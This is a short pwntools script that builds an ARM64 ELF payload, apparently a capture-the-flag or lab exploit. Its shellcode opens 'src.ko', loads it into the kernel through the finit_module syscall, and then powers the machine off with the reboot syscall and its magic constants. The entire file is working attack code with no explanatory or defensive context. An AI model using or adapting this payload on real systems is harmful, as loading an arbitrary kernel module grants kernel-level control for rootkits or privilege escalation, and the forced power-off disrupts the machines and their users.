#!/usr/bin/env python3

from pwn import *
import sys
import os

context.arch = 'arm64'

assert len(sys.argv) == 2

data = make_elf(asm(shellcraft.write(1, 'Hacker yo\n', 10) +
    shellcraft.open('src.ko', 'O_RDONLY', 0) +
    shellcraft.pushstr('') + shellcraft.syscall(273, 3, 'sp', 0) +
    shellcraft.write(1, 'End of Hack!\n', 13) +
    shellcraft.syscall('SYS_reboot', 0xfee1dead, 672274793, 0x4321FEDC, 0)
))

open(sys.argv[1], 'wb').write(data)
